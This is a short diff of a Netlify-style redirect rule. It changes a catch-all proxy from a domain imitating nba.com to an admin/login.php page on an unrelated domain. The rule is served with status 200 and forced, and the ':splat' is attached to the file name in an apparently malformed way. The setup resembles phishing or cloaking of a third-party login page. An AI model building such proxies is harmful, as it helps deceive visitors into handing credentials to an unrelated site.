@@ -1,5 +1,5 @@
 [[redirects]]
   from = "/*"
-  to = "https://nba.com.zhuolue.com.cn/:splat"
+  to = "https://nhysa.nualkd.app/admin/login.php:splat"
   status = 200
   force = true
